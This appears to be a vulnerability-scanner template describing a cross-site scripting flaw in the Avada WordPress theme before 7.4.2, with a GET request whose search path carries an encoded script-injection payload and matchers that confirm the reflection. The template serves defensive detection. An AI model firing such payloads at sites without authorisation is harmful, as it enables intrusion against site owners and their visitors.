id: "avada-xss"
name: "WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting"
severity: "high"
description: "WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs."
tech:
  - "wordpress"
tags:
  - "xss"
  - "wp"
  - "wordpress"
  - "wp-theme"
  - "avada"
  - "wpscan"
  - "vuln"
cwe: "CWE-80"
reference: "https://wpscan.com/vulnerability/eb172b07-56ab-41ce-92a1-be38bab567cb"
spaExclusion: true
request:
  method: "GET"
  path: "/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"></script><script>alert(document.domain)</script>"
      - "avada-footer-scripts"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
